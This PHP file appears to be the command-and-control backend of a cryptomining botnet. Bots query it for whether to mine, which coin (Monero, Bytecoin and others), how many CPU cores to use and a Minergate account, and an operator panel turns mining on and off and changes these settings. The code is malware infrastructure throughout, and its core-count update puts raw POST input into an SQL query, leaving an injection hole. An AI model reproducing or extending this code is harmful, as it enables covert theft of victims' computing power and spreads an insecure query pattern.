<?php

include('../inc/db.php');

$uri = $_SERVER['REQUEST_URI'];

// Requesting from bot

if(strpos($uri, "request")) {

    if(isset($_POST['command']) && $_POST['command'] == "mine") {

        $user_query = "SELECT * FROM commands WHERE command=:command";
		$user_data = [':command' => "mine"];
		$search_command = DB::query($user_query, $user_data);
        $data = $search_command[0];
        $enabled = $data['enabled'];

        echo $enabled;
    }

    if(isset($_POST['mine']) && $_POST['mine'] == "coin") {

        $user_query = "SELECT * FROM commands WHERE command=:command";
		$user_data = [':command' => "coin"];
		$search_command = DB::query($user_query, $user_data);
        $data = $search_command[0];
        $coin = $data['enabled'];

        echo $coin;

    }

    if(isset($_POST['mine']) && $_POST['mine'] == "cores") {

        $user_query = "SELECT * FROM commands WHERE command=:command";
		$user_data = [':command' => "cores"];
		$search_command = DB::query($user_query, $user_data);
        $data = $search_command[0];
        $coin = $data['enabled'];

        echo $coin;
    }

    if(isset($_POST['mine']) && $_POST['mine'] == "email") {

        echo "email"; // Minergate user email

    }

}


// Recieving from panel

if(strpos($uri, "panel")) {
    
    // Starting / stopping mining
    $query = 'SELECT * FROM commands WHERE command=:command';
    $qd = [':command' => "mine"];
    $command = DB::query($query, $qd);
    $data = $command[0];
    $enabled = $data['enabled'];
            
    if(isset($_POST['command']) && $_POST['command'] == "mine") {

        $shouldmine = $_POST['enabled'];

        if($shouldmine == "true" && $enabled == "false") {

            $query = "UPDATE commands SET enabled='true' WHERE command=:command";
            $data = [':command' => "mine"];
            $command = DB::query($query, $data);
    
            echo "Started mining";

        } else if($shouldmine == "false" && $enabled == "true") {

            $query = "UPDATE commands SET enabled='false' WHERE command=:command";
            $data = [':command' => "mine"];
            $command = DB::query($query, $data);

            echo "Stopped mining";

        } else { // if that fails then set to false

            $query = "UPDATE commands SET enabled='false' WHERE command=:command";
            $data = [':command' => "mine"];
            $command = DB::query($query, $data);

            echo "Error mining";

        }

    }

    // Changing coin type
    $query = "SELECT * FROM commands WHERE command=:command";
    $qd = [':command' => "coin"];
    $command = DB::query($query, $qd);
    $data = $command[0];
    $curcoin = $data['enabled'];

    if(isset($_POST['coin'])) {

        $coin = $_POST['coin'];

        if($coin == $curcoin)
            exit;

        if($coin == "xmr") {

            $uquery = "UPDATE commands SET enabled='xmr' WHERE command=:command";
            $udata = [':command' => "coin"];
            $search_command = DB::query($uquery, $udata);

        } else if($coin == "bcn") {

            $uquery = "UPDATE commands SET enabled='bcn' WHERE command=:command";
            $udata = [':command' => "coin"];
            $search_command = DB::query($uquery, $udata);

        } else if($coin == "dsh") {

            $uquery = "UPDATE commands SET enabled='dsh' WHERE command=:command";
            $udata = [':command' => "coin"];
            $search_command = DB::query($uquery, $udata);

        } else if($coin == "qcn") {

            $uquery = "UPDATE commands SET enabled='qcn' WHERE command=:command";
            $udata = [':command' => "coin"];
            $search_command = DB::query($uquery, $udata);

        } else {
            echo "Error setting coin";
            exit;
        }

        echo "Mining ".$coin;

    }

    // Cores to use
    if(isset($_POST['command']) && $_POST['command'] == "cores") {

        $cores = $_POST['enabled'];
        echo $cores;

        $uquery = "UPDATE commands SET enabled='$cores' WHERE command=:command";
        $udata = [':command' => "cores"];
        $search_command = DB::query($uquery, $udata);

    }

}

?>